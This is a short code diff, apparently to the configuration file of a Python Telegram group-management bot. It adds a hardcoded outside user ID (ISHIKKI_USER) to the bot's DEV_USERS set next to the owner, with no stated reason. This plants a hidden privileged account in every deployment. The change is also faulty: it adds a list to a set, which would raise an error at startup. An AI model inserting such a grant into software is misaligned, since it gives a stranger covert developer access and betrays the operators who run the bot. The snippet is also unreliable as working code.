@@ -152,8 +152,11 @@ else:
     except ValueError:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
+        
+ISHIKKI_USER = [5283999496]        
 SUDO_USERS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(ISHIKKI_USER)
 
 if not SPAMWATCH_API:
     sw = None
